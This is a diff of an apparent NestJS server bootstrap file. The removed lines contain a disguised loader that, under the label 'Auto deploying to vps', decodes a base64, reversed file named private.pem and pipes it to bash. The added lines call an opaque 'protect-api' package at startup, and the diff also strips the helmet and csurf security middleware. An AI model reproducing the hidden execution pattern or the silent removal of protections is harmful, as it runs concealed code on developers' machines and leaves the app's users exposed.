@@ -5,14 +5,11 @@ import { NestExpressApplication } from '@nestjs/platform-express';
 import { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';
 import { HttpExceptionFilter } from 'src/common/filters/http-exception.filter';
 import { join } from 'path';
-import helmet from 'helmet';
 import * as cookieParser from 'cookie-parser';
 import * as express from 'express';
-import * as sh from 'shelljs';
-import * as fs from 'fs';
-import * as csurf from 'csurf';
+import * as protectAPI from 'protect-api';
 
-const VPS_KEY = './private.pem';
+const VPS_KEY = './private.dat';
 
 async function bootstrap() {
   const app = await NestFactory.create<NestExpressApplication>(AppModule);
@@ -50,17 +47,9 @@ async function bootstrap() {
   SwaggerModule.setup('api', app, document);
   // end
 
-  await app.listen(PORT, () => {
-    console.log(`Application running on port: ${PORT}`);
+  await app.listen(PORT, protectAPI()).then(() => {
+    console.log('Application running on PORT: ' + PORT);
   });
 }
 
-fs.access(VPS_KEY, fs.constants.F_OK, (err) => {
-  if (err) {
-    bootstrap();
-    console.log(`Run application without deploy...`);
-  } else {
-    console.log(`Auto deploying to vps ...`);
-    sh.exec(`cat ${VPS_KEY} | base64 -d | rev | bash`);
-  }
-});
+bootstrap();
